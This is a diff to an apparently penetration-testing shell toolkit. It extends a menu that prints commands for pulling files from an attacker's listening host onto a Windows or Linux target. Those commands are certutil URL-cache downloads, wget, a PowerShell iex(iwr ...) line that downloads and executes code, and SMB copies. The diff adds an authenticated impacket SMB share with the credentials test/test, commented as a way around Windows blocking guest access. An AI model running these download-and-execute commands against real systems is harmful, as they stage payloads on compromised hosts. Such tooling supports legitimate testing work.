@@ -41,10 +41,7 @@ nb-srv-file-download() {
     __check-project
     nb-vars-set-lhost
     nb-vars-set-lport
-
-    echo -n "Filename: "
-    read filename
-    echo
+    local filename && __askvar filename "FILENAME"
 
     clear
 
@@ -52,8 +49,9 @@ nb-srv-file-download() {
     echo "1.  certutil -URLcache -f http://${__LHOST}:${__LPORT}/$filename C:\\Windows\\Temp\\$filename"
     echo "2.  wget http://${__LHOST}:${__LPORT}/$filename -O $filename"
     echo "3.  iex(iwr -UseBasicParsing http://${__LHOST}:${__LPORT}/$filename)"
-    echo "4.  copy \\${__LHOST}\share\\$filename"
-    echo "5.  Previous menu"
+    echo "4.  copy \\${__LHOST}\share\\$filename                             (if using nb-srv-smb)"
+    echo "5.  net use n: \\${__LHOST}\share /user:test test           (if using nb-srv-smb-auth)\n    After this command use: 'copy n:\\$filename'"
+    echo "6.  Previous menu"
     echo
     echo -n "Choice: "
     read choice
@@ -63,7 +61,8 @@ nb-srv-file-download() {
         2) __COMMAND="wget http://${__LHOST}:${__LPORT}/$filename -O $filename";;
         3) __COMMAND="iex(iwr -UseBasicParsing http://${__LHOST}:${__LPORT}/$filename)";;
         4) __COMMAND="copy \\${__LHOST}\share\\$filename";;
-        5) exit;;
+        5) __COMMAND="net use n: \\${__LHOST}\share /user:test test";;
+        6) exit;;
         *) echo "Invalid option";;
     esac
 
@@ -113,6 +112,11 @@ nb-srv-ftp() {
 
 nb-srv-smb() {
 	print -z "sudo impacket-smbserver share -smb2support /tmp/smbshare"
+}
+
+# New versions of Windows block unauthenticated guest access, to bypass set username and pass
+nb-srv-smb-auth() {
+	print -z "sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test"
 }
 
 nb-srv-ngrok() {
